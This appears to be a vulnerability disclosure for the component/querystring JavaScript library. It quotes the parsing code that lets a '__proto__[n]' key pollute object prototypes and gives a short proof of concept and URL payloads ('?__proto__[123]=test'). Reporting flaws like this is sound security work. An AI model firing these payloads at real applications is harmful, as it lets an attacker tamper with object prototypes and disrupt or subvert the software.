## Component querystring

URL: https://github.com/component/querystring

### Vulnerable code fragment

https://github.com/component/querystring/blob/7334366bae9b0434d2aa3a6ac9a9039eb1d17144/index.js#L65-L67

```js
  var pattern = /(\w+)\[(\d+)\]/;

  ...

  var obj = {};
  var pairs = str.split('&');
  for (var i = 0; i < pairs.length; i++) {
    var parts = pairs[i].split('=');
    var key = decode(parts[0]);
    var m;

    if (m = pattern.exec(key)) {
      obj[m[1]] = obj[m[1]] || [];
      obj[m[1]][m[2]] = decode(parts[1]);
      continue;
    }
```

### PoC
```
var query = require('querystring');
query.parse('__proto__[123]=test');
```

```
?__proto__[NUMBER]=test
?__proto__[123]=test
```